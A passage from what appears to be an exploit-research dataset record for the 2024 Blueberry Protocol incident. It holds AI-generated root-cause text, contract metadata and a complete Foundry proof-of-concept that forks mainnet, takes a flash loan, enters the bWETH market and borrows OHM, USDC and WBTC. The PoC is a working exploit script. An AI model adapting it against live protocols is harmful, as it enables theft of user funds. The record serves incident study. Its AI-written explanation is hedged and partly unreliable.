idence_reasoning": "1 verified, 0 proxy", "ai_confidence_score": 0.75, "ai_confidence_verified_contracts": true, "ai_explanation": "The attacker exploited a flaw in the `enterMarkets` function of Blueberry Protocol. This function allowed users to enter markets by providing `vTokens` (which are supposed to represent collateral). However, the protocol did not properly verify if the provided `vToken` (specifically bWETH in this case) actually represented genuine collateral. The attacker supplied a bWETH token that was not backed by real collateral. This allowed them to bypass the collateral requirements and subsequently borrow significant amounts of other assets (bOHM, bUSDC, bWBTC). They then swapped these borrowed assets for WETH on a Uniswap V3 pool. Finally, the attacker repaid the initial flash loan using the acquired WETH, leaving the protocol with a substantial loss.", "ai_mitigation": [], "ai_root_cause": "The `enterMarkets` function in Blueberry Protocol's Comptroller contract did not adequately validate the collateral status of the provided `vTokens`. It relied on the `BCollateralCapErc20Interface(address(bToken)).registerCollateral(borrower)` call within `addToMarketInternal` to ensure proper collateralization, but this check was insufficient or bypassed, allowing the entry with unbacked tokens.", "ai_vulnerability_type": "Insufficient Collateral Validation", "attack_title": "Tx : https://etherscan.io/tx/0xf0464b01d962f714eee9d4392b2494524d0e10ce3eb3723873afd1346b8b06e4", "contracts": [{"abi_available": true, "address": "0xffadb0bba4379dfabfb20ca6823f6ec439429ec2", "artifact_dir": "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller", "bytecode_available": false, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.5.16+commit.9c3226ce", "contract_name": "Comptroller", "explorer_url": "https://etherscan.io/address/0xffadb0bba4379dfabfb20ca6823f6ec439429ec2", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:36:41.936Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/Comptroller.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/BToken.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/ErrorReporter.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/Exponential.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/PriceOracle/PriceOracle.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/ComptrollerInterface.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/ComptrollerStorage.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/LiquidityMiningInterface.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/Unitroller.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/BTokenInterfaces.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/EIP20Interface.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/EIP20NonStandardInterface.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/InterestRateModel.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/CarefulMath.sol", "data/contracts/2024_02_blueberryprotocol/contracts/01_vulnerable_ffadb0bb_comptroller/sources/lib/blueberry-core/contracts/money-market/ERC3156FlashBorrowerInterface.sol"], "source_hint": "AI extracted: The vulnerability lies in the `enterMarkets` function of the Blueberry Protocol. The `enterMarkets` function allows users to enter markets by providing an array of `vTokens`. However, it does not properly validate the `vTokens` provided. An attacker can provide a malicious `vToken` address that is not a valid collateral token. When the `enterMarkets` function is called with this malicious `vToken`, it can lead to unexpected behavior or vulnerabilities. In this specific attack, the attacker exploited this by calling `enterMarkets` with `bWETH` and then proceeding to borrow assets from other markets (`bOHM`, `bUSDC`, `bWBTC`) without having sufficient collateral. This was possible because the `enterMarkets` function did not enforce proper collateral checks, allowing the attacker to manipulate their borrowing capacity.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2024_02_blueberryprotocol", "id": "2024_02_blueberryprotocol", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:36:45.607Z"}, "num_bytecode_contracts": 0, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "import "forge-std/Test.sol";

import "./../interface.sol";

// @KeyInfo - Total Lost : ~$1,400,000 USD
// Attacker : https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671 (whitehat)
// Attack Contract : https://etherscan.io/address/0x3aa228a80f50763045bdfc45012da124bd0a6809
// Vulnerable Contract : https://etherscan.io/address/0xffadb0bba4379dfabfb20ca6823f6ec439429ec2
// Attack Tx : https://etherscan.io/tx/0xf0464b01d962f714eee9d4392b2494524d0e10ce3eb3723873afd1346b8b06e4

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xffadb0bba4379dfabfb20ca6823f6ec439429ec2#code

// @Analysis
// https://twitter.com/blueberryFDN/status/1760865357236211964

interface IMarketFacet {
    function enterMarkets(
        address[] calldata vTokens
    ) external returns (uint256[] memory);
}

interface bBep20Interface {
    function transfer(address dst, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(
        address owner
    ) external view returns (uint256);

    /**
     * User Interface **
     */
    function mint(
        uint256 mintAmount
    ) external returns (uint256);

    function borrow(
        uint256 borrowAmount
    ) external returns (uint256);
}

contract ContractTest is Test {
    WETH9 private WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
    IERC20 private USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    bBep20Interface private bWETH = bBep20Interface(0x643d448CEa0D3616F0b32E3718F563b164e7eDd2);
    bBep20Interface private bOHM = bBep20Interface(0x08830038A6097C10f4A814274d5A68E64648d91c);
    bBep20Interface private bUSDC = bBep20Interface(0x649127D0800a8c68290129F091564aD2F1D62De1);
    bBep20Interface private bWBTC = bBep20Interface(0xE61ad5B0E40c856E6C193120Bd3fa28A432911B6);

    IMarketFacet BlueberryProtocol = IMarketFacet(0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2);

    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    Uni_Router_V3 pool = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        vm.createSelectFork("mainnet", 19_287_289 - 1);
        vm.label(address(this), "AttackContract");
        vm.label(address(WETH), "WETH");
        vm.label(address(OHM), "OHM");
        vm.label(address(USDC), "USDC");
        vm.label(address(WBTC), "WBTC");
        vm.label(address(bWETH), "bWETH");
        vm.label(address(bOHM), "bOHM");
        vm.label(address(bUSDC), "bUSDC");
        vm.label(address(bWBTC), "bWBTC");

        vm.label(address(BlueberryProtocol), "BlueberryProtocol");

        vm.label(address(balancer), "balancer");
        vm.label(address(pool), "pool");
    }

    function approveAll() internal {
        WETH.approve(address(bWETH), type(uint256).max);
        OHM.approve(address(pool), type(uint256).max);
    }

    function testAttack() public {
        vm.deal(address(this), 0.000000000000009997 ether);
        WETH.deposit{value: 0.000000000000009997 ether}();
        approveAll();
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1_000_000_000_000_000_000;
        balancer.flashLoan(address(this), tokens, amounts, new bytes(1)); // borrow BUSD
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        address[] memory tokenList = new address[](1);
        tokenList[0] = address(bWETH);
        BlueberryProtocol.enterMarkets(tokenList);
        bWETH.mint(1_000_000_000_000_000_000);
        bOHM.borrow(8_616_071_267_266);
        bUSDC.borrow(913_262_603_416);
        bWBTC.borrow(686_690_100);
        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(OHM),
            tokenOut: address(WETH),
            fee: 3000,
            recipient: address(this),
            deadline: type(uint256).max,
            amountOut: 999_999_999_999_999_999,
            amountInMaximum: type(uint256).max,
            sqrtPriceLimitX96: 0
        });
        pool.exactOutputSingle(params);
        WETH.transfer(address(balancer), 1_000_000_000_000_000_000);
    }

    receive() external payable {}
    fallback() external payable {}
}
